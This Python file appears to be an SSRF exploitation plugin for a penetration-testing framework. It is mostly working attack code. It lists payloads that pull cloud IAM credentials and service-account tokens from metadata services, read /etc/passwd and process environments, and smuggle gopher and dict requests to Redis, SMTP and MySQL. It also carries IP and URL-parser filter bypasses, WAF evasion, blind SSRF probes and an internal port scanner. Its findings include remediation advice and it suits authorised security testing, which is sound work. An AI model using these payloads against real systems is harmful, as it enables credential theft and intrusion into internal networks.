"""Advanced SSRF exploitation — SSRFmap-level depth.

Coverage:
1. Cloud metadata — AWS IMDSv1/v2, GCP, Azure, DigitalOcean, Alibaba, Oracle
2. Protocol smuggling — gopher://, dict://, file://, ftp://, tftp://
3. IP bypass — decimal, hex, octal, IPv6, short, zero, URL encoding
4. DNS rebinding hints
5. Blind SSRF — OOB via CallbackServer + timing differential
6. Internal network probing — common internal ranges via confirmed SSRF
7. URL parser bypass — @, #, \\, unicode dots, double encoding
8. WAF bypass integration via WafBypassEngine
"""

from __future__ import annotations

import asyncio
import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# ---------------------------------------------------------------------------
# Cloud metadata endpoints (multi-provider)
# ---------------------------------------------------------------------------

CLOUD_METADATA: list[tuple[str, str, str, dict[str, str]]] = [
    # (url, label, indicator, extra_headers)
    # AWS IMDSv1
    (
        "http://169.254.169.254/latest/meta-data/",
        "AWS IMDSv1 metadata",
        "ami-id",
        {},
    ),
    (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "AWS IAM credentials",
        "AccessKeyId",
        {},
    ),
    (
        "http://169.254.169.254/latest/user-data",
        "AWS user-data",
        "",
        {},
    ),
    (
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "AWS instance identity",
        "instanceId",
        {},
    ),
    # AWS IMDSv2 (requires token header)
    (
        "http://169.254.169.254/latest/meta-data/",
        "AWS IMDSv2 metadata",
        "ami-id",
        {"X-aws-ec2-metadata-token": "basilisk_test"},
    ),
    # GCP
    (
        "http://metadata.google.internal/computeMetadata/v1/",
        "GCP metadata",
        "",
        {"Metadata-Flavor": "Google"},
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "GCP service account token",
        "access_token",
        {"Metadata-Flavor": "Google"},
    ),
    (
        "http://169.254.169.254/computeMetadata/v1/",
        "GCP metadata (IP)",
        "",
        {"Metadata-Flavor": "Google"},
    ),
    # Azure
    (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "Azure IMDS",
        "compute",
        {"Metadata": "true"},
    ),
    (
        "http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01&resource=https://management.azure.com/",
        "Azure managed identity token",
        "access_token",
        {"Metadata": "true"},
    ),
    # DigitalOcean
    (
        "http://169.254.169.254/metadata/v1/",
        "DigitalOcean metadata",
        "droplet_id",
        {},
    ),
    (
        "http://169.254.169.254/metadata/v1.json",
        "DigitalOcean metadata (JSON)",
        "droplet_id",
        {},
    ),
    # Alibaba Cloud
    (
        "http://100.100.100.200/latest/meta-data/",
        "Alibaba Cloud metadata",
        "instance-id",
        {},
    ),
    (
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "Alibaba Cloud RAM credentials",
        "AccessKeyId",
        {},
    ),
    # Oracle Cloud
    (
        "http://169.254.169.254/opc/v2/instance/",
        "Oracle Cloud IMDS",
        "availabilityDomain",
        {"Authorization": "Bearer Oracle"},
    ),
    (
        "http://169.254.169.254/opc/v1/instance/metadata/",
        "Oracle Cloud metadata v1",
        "",
        {},
    ),
]

# ---------------------------------------------------------------------------
# Protocol smuggling payloads
# ---------------------------------------------------------------------------

PROTOCOL_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload, label, indicator)
    ("file:///etc/passwd", "file:// LFI (Linux)", "root:"),
    ("file:///etc/hostname", "file:// hostname", ""),
    ("file:///proc/self/environ", "file:// proc env", "PATH="),
    ("file:///proc/self/cmdline", "file:// proc cmdline", ""),
    ("file:///proc/net/tcp", "file:// proc net", "local_address"),
    ("file:///proc/self/status", "file:// proc status", "Name:"),
    (
        "file:///C:/Windows/System32/drivers/etc/hosts",
        "file:// Windows hosts",
        "localhost",
    ),
    ("file:///C:/Windows/win.ini", "file:// win.ini", "extensions"),
    ("dict://127.0.0.1:6379/INFO", "dict:// Redis INFO", "redis_version"),
    ("dict://127.0.0.1:11211/stats", "dict:// Memcached stats", "STAT"),
    (
        "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
        "gopher:// Redis INFO",
        "redis_version",
    ),
    (
        "gopher://127.0.0.1:25/_EHLO%20test%0d%0a",
        "gopher:// SMTP EHLO",
        "ESMTP",
    ),
    (
        "gopher://127.0.0.1:3306/_%00%00%00%03SELECT%20VERSION()",
        "gopher:// MySQL version",
        "",
    ),
    ("ftp://127.0.0.1/", "ftp:// localhost", ""),
    ("tftp://127.0.0.1/test", "tftp:// probe", ""),
]

# ---------------------------------------------------------------------------
# IP bypass variants for 127.0.0.1
# ---------------------------------------------------------------------------

IP_BYPASS_PAYLOADS: list[tuple[str, str]] = [
    ("http://127.0.0.1/", "standard localhost"),
    ("http://localhost/", "localhost hostname"),
    ("http://127.1/", "short IP"),
    ("http://0x7f000001/", "hex IP"),
    ("http://2130706433/", "decimal IP"),
    ("http://0177.0.0.1/", "octal IP"),
    ("http://0/", "zero IP"),
    ("http://[::1]/", "IPv6 loopback"),
    ("http://[::ffff:127.0.0.1]/", "IPv6-mapped IPv4"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "IPv6 full mapped"),
    ("http://0.0.0.0/", "all interfaces"),
    ("http://127.0.0.1.nip.io/", "wildcard DNS (nip.io)"),
    ("http://127.0.0.1.sslip.io/", "wildcard DNS (sslip.io)"),
    ("http://localtest.me/", "localtest.me -> 127.0.0.1"),
    ("http://127.127.127.127/", "alternative 127.x"),
]

# ---------------------------------------------------------------------------
# URL parser differential bypass templates
# ---------------------------------------------------------------------------

URL_BYPASS_TEMPLATES: list[tuple[str, str]] = [
    ("http://127.0.0.1@{host}/", "at-sign confusion"),
    ("http://127.0.0.1#@{host}/", "fragment confusion"),
    ("http://{host}@127.0.0.1/", "reverse at-sign"),
    ("http://127.0.0.1\\@{host}/", "backslash at-sign"),
    ("http://127.0.0.1%23@{host}/", "encoded hash at-sign"),
    ("{scheme}://{host}/../../../../../etc/passwd", "path traversal"),
    ("http://127.0.0.1:80\\@{host}/", "port backslash"),
    ("http://{host}%00@127.0.0.1/", "null byte confusion"),
    ("http://127%2e0%2e0%2e1/", "URL-encoded dots"),
    ("http://127.0.0.1./", "trailing dot"),
    ("http://①②⑦.⓪.⓪.①/", "unicode circled digits"),
    ("http://127%E3%80%820%E3%80%820%E3%80%821/", "fullwidth dot bypass"),
]

# ---------------------------------------------------------------------------
# Internal port scan targets
# ---------------------------------------------------------------------------

INTERNAL_PORTS: list[tuple[int, str]] = [
    (22, "SSH"),
    (80, "HTTP"),
    (443, "HTTPS"),
    (3000, "Grafana/Node"),
    (3306, "MySQL"),
    (5432, "PostgreSQL"),
    (5672, "RabbitMQ"),
    (6379, "Redis"),
    (8080, "HTTP-Alt"),
    (8443, "HTTPS-Alt"),
    (8888, "Jupyter"),
    (9090, "Prometheus"),
    (9200, "Elasticsearch"),
    (9300, "ES Transport"),
    (10250, "Kubelet API"),
    (11211, "Memcached"),
    (15672, "RabbitMQ Mgmt"),
    (27017, "MongoDB"),
]

# ---------------------------------------------------------------------------
# SSRF-injectable parameters
# ---------------------------------------------------------------------------

SSRF_PARAMS = [
    "url", "link", "redirect", "page", "uri", "src", "href",
    "path", "file", "document", "domain", "host", "site",
    "callback", "return", "next", "target", "proxy", "fetch",
    "dest", "destination", "rurl", "img", "image",
]

SCAN_PAGES = ["/", "/fetch", "/proxy", "/load", "/api/fetch", "/redirect"]

TIMING_THRESHOLD = 3.0
TIMING_RETRIES = 2


class SsrfAdvancedPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="ssrf_advanced",
        display_name="Advanced SSRF Exploitation",
        category=PluginCategory.PENTESTING,
        description=(
            "SSRFmap-level: cloud metadata (6 providers), protocol smuggling, "
            "IP bypass variants, blind SSRF (OOB + timing), "
            "URL parser differentials, WAF bypass"
        ),
        depends_on=["ssrf_check"],
        produces=["ssrf_advanced_findings"],
        timeout=90.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"ssrf_advanced": []},
            )

        # Get confirmed SSRF endpoints from pipeline
        ssrf_key = f"ssrf_check:{target.host}"
        ssrf_result = ctx.pipeline.get(ssrf_key)
        confirmed_ssrf: list[dict] = []
        if ssrf_result and ssrf_result.ok:
            confirmed_ssrf = ssrf_result.data.get("ssrf_tests", [])
            confirmed_ssrf = [t for t in confirmed_ssrf if t.get("confirmed")]

        # Baseline response length
        baseline_len = 0
        try:
            async with ctx.rate:
                resp = await ctx.http.get(base_url, timeout=5.0)
                baseline_body = await resp.text(encoding="utf-8", errors="replace")
                baseline_len = len(baseline_body)
        except Exception:
            pass

        # Phase 1: Cloud metadata via confirmed SSRF endpoints
        if confirmed_ssrf and not ctx.should_stop:
            await self._phase_cloud_metadata(
                ctx, base_url, confirmed_ssrf, findings, tested,
            )

        # Phase 2: Protocol smuggling on confirmed SSRF endpoints
        if confirmed_ssrf and not ctx.should_stop:
            await self._phase_protocol_smuggling(
                ctx, base_url, confirmed_ssrf, findings, tested,
            )

        # Phase 3: URL parser differential bypass (discovery)
        if not ctx.should_stop:
            await self._phase_url_bypass(
                ctx, base_url, target.host, baseline_len, findings, tested,
            )

        # Phase 4: IP bypass variants (discovery)
        if not ctx.should_stop:
            await self._phase_ip_bypass(
                ctx, base_url, baseline_len, findings, tested,
            )

        # Phase 5: Blind SSRF via OOB callback
        if not ctx.should_stop and ctx.callback:
            await self._phase_blind_oob(
                ctx, base_url, target.host, findings, tested,
            )

        # Phase 6: Blind SSRF via timing differential
        if not confirmed_ssrf and not ctx.should_stop:
            await self._phase_blind_timing(
                ctx, base_url, findings, tested,
            )

        # Phase 7: Internal port scan via confirmed SSRF
        if confirmed_ssrf and not ctx.should_stop:
            await self._phase_internal_port_scan(
                ctx, base_url, confirmed_ssrf, findings, tested,
            )

        if not findings:
            findings.append(Finding.info(
                "No advanced SSRF vulnerabilities detected",
                tags=["pentesting", "ssrf"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"ssrf_advanced": tested},
        )

    # ------------------------------------------------------------------
    # Phase 1: Cloud metadata via SSRF
    # ------------------------------------------------------------------

    async def _phase_cloud_metadata(
        self, ctx, base_url: str,
        confirmed_ssrf: list[dict],
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test cloud metadata endpoints through confirmed SSRF."""
        for ep in confirmed_ssrf[:2]:
            if ctx.should_stop:
                break

            page = ep.get("page", "/")
            param = ep.get("param", "url")

            for meta_url, label, indicator, _headers in CLOUD_METADATA:
                if ctx.should_stop:
                    break

                # Apply WAF bypass variants
                payloads = self._waf_variants(ctx, meta_url)

                for payload in payloads:
                    url = (
                        f"{base_url}{page}?{param}="
                        f"{quote(payload, safe='')}"
                    )
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(url, timeout=10.0)
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )

                            is_hit = False
                            if indicator and indicator.lower() in body.lower() or (
                                not indicator
                                and resp.status == 200
                                and len(body) > 50
                                and body.strip()[:1] in ("{", "[", "a")
                            ):
                                is_hit = True

                            if is_hit:
                                severity = Finding.critical
                                if "credential" in label.lower() or "token" in label.lower():
                                    severity = Finding.critical
                                elif "metadata" in label.lower():
                                    severity = Finding.high

                                tested.append({
                                    "type": "cloud_metadata",
                                    "provider": label,
                                    "payload": payload,
                                    "indicator": indicator,
                                })
                                findings.append(severity(
                                    f"SSRF to cloud metadata: {label}",
                                    description=(
                                        f"Cloud metadata service accessible "
                                        f"via SSRF. Provider: {label}. "
                                        f"This may expose instance credentials, "
                                        f"API tokens, or configuration data."
                                    ),
                                    evidence=(
                                        f"Payload: {payload}\n"
                                        f"Indicator: {indicator}\n"
                                        f"Response preview: {body[:300]}"
                                    ),
                                    remediation=(
                                        "Fix the SSRF vulnerability. "
                                        "Enable IMDSv2 (AWS) with hop limit. "
                                        "Block metadata IPs at network level. "
                                        "Use service account restrictions."
                                    ),
                                    tags=[
                                        "pentesting", "ssrf", "cloud-metadata",
                                    ],
                                ))
                                break  # Found for this metadata endpoint
                    except Exception:
                        continue

    # ------------------------------------------------------------------
    # Phase 2: Protocol smuggling
    # ------------------------------------------------------------------

    async def _phase_protocol_smuggling(
        self, ctx, base_url: str,
        confirmed_ssrf: list[dict],
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test protocol smuggling on confirmed SSRF endpoints."""
        for ep in confirmed_ssrf[:2]:
            if ctx.should_stop:
                break

            page = ep.get("page", "/")
            param = ep.get("param", "url")

            for payload, label, indicator in PROTOCOL_PAYLOADS:
                if ctx.should_stop:
                    break

                url = f"{base_url}{page}?{param}={quote(payload, safe='')}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(url, timeout=10.0)
                        body = await resp.text(
                            encoding="utf-8", errors="replace",
                        )

                        if indicator and indicator.lower() in body.lower():
                            tested.append({
                                "type": "protocol_smuggling",
                                "payload": payload,
                                "label": label,
                                "indicator": indicator,
                            })
                            findings.append(Finding.critical(
                                f"SSRF protocol smuggling: {label}",
                                description=(
                                    f"Server followed "
                                    f"{payload.split('://')[0]}:// protocol. "
                                    f"Response contains '{indicator}'."
                                ),
                                evidence=(
                                    f"Payload: {payload}\n"
                                    f"Indicator: {indicator}\n"
                                    f"Response preview: {body[:300]}"
                                ),
                                remediation=(
                                    "Block all non-HTTP(S) protocols in URL "
                                    "validation. Use an allowlist of "
                                    "permitted schemes."
                                ),
                                tags=[
                                    "pentesting", "ssrf", "protocol-smuggling",
                                ],
                            ))
                except Exception:
                    continue

    # ------------------------------------------------------------------
    # Phase 3: URL parser bypass
    # ------------------------------------------------------------------

    async def _phase_url_bypass(
        self, ctx, base_url: str, host: str, baseline_len: int,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test URL parser differential bypasses."""
        scheme = base_url.split("://")[0]

        for param in SSRF_PARAMS[:6]:
            if ctx.should_stop:
                break

            for page in SCAN_PAGES[:3]:
                if ctx.should_stop:
                    break

                for template, desc in URL_BYPASS_TEMPLATES:
                    if ctx.should_stop:
                        break

                    try:
                        payload = template.format(host=host, scheme=scheme)
                    except (KeyError, IndexError):
                        continue

                    # Apply WAF bypass variants
                    variants = self._waf_variants(ctx, payload)

                    for variant in variants:
                        url = (
                            f"{base_url}{page}?{param}="
                            f"{quote(variant, safe='')}"
                        )
                        try:
                            async with ctx.rate:
                                resp = await ctx.http.get(url, timeout=8.0)
                                body = await resp.text(
                                    encoding="utf-8", errors="replace",
                                )

                                matched = self._check_internal_indicators(
                                    body, baseline_len, variant,
                                )
                                if matched:
                                    tested.append({
                                        "type": "url_bypass",
                                        "payload": variant,
                                        "description": desc,
                                        "indicators": matched[:3],
                                    })
                                    findings.append(Finding.high(
                                        f"SSRF URL bypass: {desc}",
                                        description=(
                                            f"URL parser differential allows "
                                            f"internal access via {desc}."
                                        ),
                                        evidence=(
                                            f"Payload: {variant}\n"
                                            f"Indicators: "
                                            f"{', '.join(matched[:3])}"
                                        ),
                                        remediation=(
                                            "Resolve URL to IP before "
                                            "validation. Block private IP "
                                            "ranges at network level."
                                        ),
                                        tags=["pentesting", "ssrf", "bypass"],
                                    ))
                                    break  # One per template
                        except Exception:
                            continue

    # ------------------------------------------------------------------
    # Phase 4: IP bypass variants
    # ------------------------------------------------------------------

    async def _phase_ip_bypass(
        self, ctx, base_url: str, baseline_len: int,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test IP representation bypass variants."""
        for param in SSRF_PARAMS[:5]:
            if ctx.should_stop:
                break

            for page in SCAN_PAGES[:2]:
                if ctx.should_stop:
                    break

                for payload, desc in IP_BYPASS_PAYLOADS:
                    if ctx.should_stop:
                        break

                    url = (
                        f"{base_url}{page}?{param}="
                        f"{quote(payload, safe='')}"
                    )
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(url, timeout=8.0)
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )

                            matched = self._check_internal_indicators(
                                body, baseline_len, payload,
                            )
                            if matched:
                                tested.append({
                                    "type": "ip_bypass",
                                    "payload": payload,
                                    "description": desc,
                                    "indicators": matched[:3],
                                })
                                findings.append(Finding.high(
                                    f"SSRF IP bypass: {desc}",
                                    description=(
                                        f"IP representation bypass "
                                        f"({desc}) allows accessing "
                                        f"internal services."
                                    ),
                                    evidence=(
                                        f"Payload: {payload}\n"
                                        f"Indicators: "
                                        f"{', '.join(matched[:3])}"
                                    ),
                                    remediation=(
                                        "Normalize IP addresses before "
                                        "validation. Resolve DNS and check "
                                        "against private ranges."
                                    ),
                                    tags=[
                                        "pentesting", "ssrf", "ip-bypass",
                                    ],
                                ))
                                break  # One per IP variant
                    except Exception:
                        continue

    # ------------------------------------------------------------------
    # Phase 5: Blind SSRF via OOB callback
    # ------------------------------------------------------------------

    async def _phase_blind_oob(
        self, ctx, base_url: str, host: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Detect blind SSRF using out-of-band callbacks."""
        tokens_sent: list[tuple[str, str, str]] = []

        for param in SSRF_PARAMS[:8]:
            if ctx.should_stop:
                break

            for page in SCAN_PAGES[:3]:
                if ctx.should_stop:
                    break

                token = ctx.callback.generate_token(
                    self.meta.name, host, "ssrf_blind",
                    description=f"Blind SSRF via {param} on {page}",
                )
                callback_url = ctx.callback.build_payload_url(token)

                # Send via GET
                try:
                    async with ctx.rate:
                        await ctx.http.get(
                            f"{base_url}{page}?{param}="
                            f"{quote(callback_url, safe='')}",
                            timeout=8.0,
                        )
                except Exception:
                    pass

                # Send via POST
                try:
                    async with ctx.rate:
                        await ctx.http.post(
                            f"{base_url}{page}",
                            data={param: callback_url},
                            timeout=8.0,
                        )
                except Exception:
                    pass

                tokens_sent.append((token, param, page))

        # Wait for OOB callbacks
        if tokens_sent:
            await asyncio.sleep(3)

            for token, param, page in tokens_sent:
                if ctx.callback.has_callback(token):
                    hits = ctx.callback.get_hits(token)
                    tested.append({
                        "type": "blind_oob",
                        "param": param,
                        "page": page,
                        "token": token,
                        "hits": len(hits),
                    })
                    findings.append(Finding.high(
                        f"Blind SSRF confirmed via OOB: {param} on {page}",
                        description=(
                            f"Out-of-band callback received. The server made "
                            f"an outbound HTTP request to the attacker URL "
                            f"when parameter '{param}' was set to an external "
                            f"URL on page '{page}'."
                        ),
                        evidence=(
                            f"OOB token: {token}\n"
                            f"Param: {param}\nPage: {page}\n"
                            f"Callbacks received: {len(hits)}"
                        ),
                        remediation=(
                            "Validate and sanitize all user-supplied URLs. "
                            "Block outbound requests to untrusted destinations. "
                            "Use URL allowlists."
                        ),
                        tags=["pentesting", "ssrf", "blind", "oob"],
                    ))

    # ------------------------------------------------------------------
    # Phase 6: Blind SSRF via timing
    # ------------------------------------------------------------------

    async def _phase_blind_timing(
        self, ctx, base_url: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Detect blind SSRF via response timing differential."""
        for param in SSRF_PARAMS[:5]:
            if ctx.should_stop:
                break

            for page in SCAN_PAGES[:2]:
                if ctx.should_stop:
                    break

                # Measure baseline
                baseline_time = await self._measure_time(
                    ctx,
                    f"{base_url}{page}?{param}="
                    f"{quote('http://example.com/', safe='')}",
                )
                if baseline_time is None:
                    continue

                # Test with non-routable IPs (should cause timeout)
                slow_targets = [
                    ("http://10.255.255.1/", "non-routable IP (10.x)"),
                    ("http://192.168.255.255/", "non-routable IP (192.168.x)"),
                    ("http://172.31.255.255/", "non-routable IP (172.x)"),
                ]

                for payload, desc in slow_targets:
                    if ctx.should_stop:
                        break

                    elapsed = await self._measure_time(
                        ctx,
                        f"{base_url}{page}?{param}="
                        f"{quote(payload, safe='')}",
                    )
                    if elapsed is None:
                        continue

                    delta = elapsed - baseline_time
                    if delta > TIMING_THRESHOLD:
                        # Confirm with retry
                        confirmed = 0
                        for _ in range(TIMING_RETRIES):
                            retry = await self._measure_time(
                                ctx,
                                f"{base_url}{page}?{param}="
                                f"{quote(payload, safe='')}",
                            )
                            if (
                                retry
                                and retry - baseline_time > TIMING_THRESHOLD
                            ):
                                confirmed += 1

                        if confirmed >= 1:
                            tested.append({
                                "type": "blind_timing",
                                "param": param,
                                "page": page,
                                "payload": payload,
                                "delta": round(delta, 2),
                                "confirmed": confirmed,
                            })
                            findings.append(Finding.medium(
                                f"Blind SSRF timing: {param} ({desc})",
                                description=(
                                    f"Response delayed {delta:.1f}s when "
                                    f"targeting {desc}. Server may be making "
                                    f"outbound requests."
                                ),
                                evidence=(
                                    f"Page: {page}\nParam: {param}\n"
                                    f"Baseline: {baseline_time:.2f}s\n"
                                    f"Payload: {elapsed:.2f}s\n"
                                    f"Delta: {delta:.2f}s\n"
                                    f"Confirmed: {confirmed}x"
                                ),
                                remediation=(
                                    "Validate and sanitize all user-supplied "
                                    "URLs. Block requests to internal/private "
                                    "IP ranges."
                                ),
                                tags=[
                                    "pentesting", "ssrf", "blind", "timing",
                                ],
                            ))
                            break  # One per param

    # ------------------------------------------------------------------
    # Phase 7: Internal port scan via SSRF
    # ------------------------------------------------------------------

    async def _phase_internal_port_scan(
        self, ctx, base_url: str,
        confirmed_ssrf: list[dict],
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Scan internal ports through confirmed SSRF endpoint."""
        if not confirmed_ssrf:
            return

        ep = confirmed_ssrf[0]
        page = ep.get("page", "/")
        param = ep.get("param", "url")

        # Baseline: closed port timing
        closed_time = await self._measure_time(
            ctx,
            f"{base_url}{page}?{param}="
            f"{quote('http://127.0.0.1:1/', safe='')}",
        )

        open_ports: list[tuple[int, str]] = []

        for port, service in INTERNAL_PORTS:
            if ctx.should_stop:
                break

            payload = f"http://127.0.0.1:{port}/"
            url = f"{base_url}{page}?{param}={quote(payload, safe='')}"

            try:
                async with ctx.rate:
                    t0 = time.monotonic()
                    resp = await ctx.http.get(url, timeout=10.0)
                    elapsed = time.monotonic() - t0
                    body = await resp.text(
                        encoding="utf-8", errors="replace",
                    )

                    # Open port heuristics
                    is_open = False
                    if closed_time and abs(elapsed - closed_time) > 1.0:
                        is_open = True
                    if resp.status == 200 and len(body) > 100:
                        is_open = True

                    if is_open:
                        open_ports.append((port, service))
            except Exception:
                continue

        if open_ports:
            port_list = ", ".join(
                f"{p}({s})" for p, s in open_ports
            )
            tested.append({
                "type": "internal_port_scan",
                "open_ports": [
                    {"port": p, "service": s} for p, s in open_ports
                ],
            })
            findings.append(Finding.high(
                f"Internal ports via SSRF: {port_list}",
                description=(
                    f"Discovered {len(open_ports)} open internal ports "
                    f"via SSRF: {port_list}. These services are not "
                    f"externally accessible but reachable through the "
                    f"SSRF vulnerability."
                ),
                evidence=f"Open ports: {port_list}",
                remediation=(
                    "Fix the SSRF vulnerability. "
                    "Implement network segmentation. "
                    "Use service mesh for internal communication."
                ),
                tags=["pentesting", "ssrf", "port-scan"],
            ))

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _check_internal_indicators(
        body: str, baseline_len: int, payload: str = "",
    ) -> list[str]:
        """Check response body for internal content indicators.

        Filters out indicators that appear in the payload itself
        to avoid false positives from reflected URLs in error pages.
        """
        if len(body) == baseline_len:
            return []

        body_lower = body.lower()
        payload_lower = payload.lower()
        indicators = [
            "root:", "localhost", "127.0.0.1",
            "internal", "private", "192.168.",
            "10.0.", "172.16.", "::1",
            "ami-id", "instance-id", "droplet_id",
            "redis_version", "STAT ", "mysql",
            "postgresql", "mongodb",
        ]
        # Only report indicators found in body but NOT present in payload
        return [
            i for i in indicators
            if i in body_lower and i not in payload_lower
        ]

    @staticmethod
    def _waf_variants(ctx, payload: str) -> list[str]:
        """Generate WAF bypass variants if engine available."""
        variants = [payload]
        if ctx.waf_bypass and ctx.waf_bypass.waf_detected:
            waf_encoded = ctx.waf_bypass.encode(payload, "ssrf")
            for v in waf_encoded:
                if v not in variants:
                    variants.append(v)
        return variants[:3]  # Limit to avoid excessive requests

    @staticmethod
    async def _measure_time(ctx, url: str) -> float | None:
        """Measure response time for a URL."""
        try:
            async with ctx.rate:
                t0 = time.monotonic()
                await ctx.http.get(url, timeout=15.0)
                return time.monotonic() - t0
        except Exception:
            return None
